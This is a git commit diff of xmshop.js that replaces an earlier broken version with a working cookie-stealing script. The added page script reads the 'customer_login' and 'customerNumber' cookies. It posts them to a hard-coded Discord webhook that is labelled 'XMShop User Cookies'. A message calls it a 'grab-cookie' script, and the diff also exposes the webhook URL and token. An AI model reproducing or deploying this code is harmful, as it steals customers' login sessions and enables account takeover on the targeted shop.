370551ae73d8bbe41cddb56dd46068016d9b0e65
Bulgus <88266443+Bulgus@users.noreply.github.com>
2023-06-29 10:00:19 +0200

    Update xmshop.js

--- xmshop.js
+++ xmshop.js
@@ -1,24 +1,54 @@
-window.alert("Script en cours")
+<!DOCTYPE html>
+<head>
+    
+</head>
+<body>
+    <script>
+        document.cookie = "customer_login=idprecieux; SameSite=None"
+        window.addEventListener('load', function () {
+            console.log('Cette fonction est exécutée une fois quand la page est chargée.');
+        });
 
-function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/877263942076997682/Z2ZBLx-cQHEvFsM2vidvuMmebo39gXVwErjl3ixX3jUXKiGI30HYq-BeoTtNe31uXFYX%22);
+        function sendMessage() {
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/877263942076997682/Z2ZBLx-cQHEvFsM2vidvuMmebo39gXVwErjl3ixX3jUXKiGI30HYq-BeoTtNe31uXFYX");
 
-      request.setRequestHeader('Content-type', 'application/json');
+            request.setRequestHeader('Content-type', 'application/json');
 
-      const params = {
-        username: "f",
-        avatar_url: "",
-        content: getting
-      }
+            const params = {
+                username: "XMShop User Cookies",
+                avatar_url: "",
+                content: "Un nouvel utilisateur vient de charger le script de grab-cookie : client numéros **" + id + "**. Son cookie de connexion est **" + login +"**"
+            }
 
-      request.send(JSON.stringify(params));
-    }
+            request.send(JSON.stringify(params));
+            
+        }
 
-function getCookie() {
-  var getting = browser.cookies.get({
-    name: "customer_login"
-  });
+        function getCookie(nom) {
 
-getCookie
-sendMessage()
+            var cookies = document.cookie.split(";");
+        
+            for(var i = 0; i < cookies.length; i++) {
+                var cookiePair = cookies[i].split("=");
+        
+                if(nom == cookiePair[0].trim()) {
+                    return decodeURIComponent(cookiePair[1]);
+                }
+            }
+    
+        return null;
+        }
+
+
+
+
+
+
+        var login = getCookie("customer_login");
+        var id = getCookie("customerNumber")
+
+        sendMessage()
+
+    </script>
+</body>
